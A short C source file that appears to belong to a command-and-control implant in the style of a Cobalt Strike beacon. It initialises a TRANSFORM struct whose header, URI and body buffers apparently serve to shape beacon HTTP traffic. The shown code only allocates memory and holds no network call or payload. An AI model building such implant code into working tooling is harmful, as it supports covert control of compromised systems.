#include "pch.h"

#include "beacon.h"

typedef struct TRANSFORM
{
	const char* headers;
	const char* uriParams;
	const char* uri;
	void* body;
	DWORD bodyLength;
	unsigned int outputLength;
	const char* transformed;
	char* temporalBuffer;
	datap* parser;
} TRANSFORM;

void TransformInit(TRANSFORM* transform, int size)
{
#define MAX_HEADERS 1024
#define MAX_URI_PARAMS 1024
#define MAX_URI 1024
	transform->outputLength = max(3 * size, 0x2000);

	datap* parser = BeaconDataAlloc(MAX_HEADERS + MAX_URI_PARAMS + MAX_URI + transform->outputLength + transform->outputLength + transform->outputLength);
	transform->headers = BeaconDataPtr(parser, MAX_HEADERS);
	transform->uriParams = BeaconDataPtr(parser, MAX_URI_PARAMS);
	transform->uri = BeaconDataPtr(parser, MAX_URI);
	transform->body = BeaconDataPtr(parser, transform->outputLength);
	transform->transformed = BeaconDataPtr(parser, transform->outputLength);
	transform->temporalBuffer = BeaconDataPtr(parser, transform->outputLength);
	transform->bodyLength = 0;
}
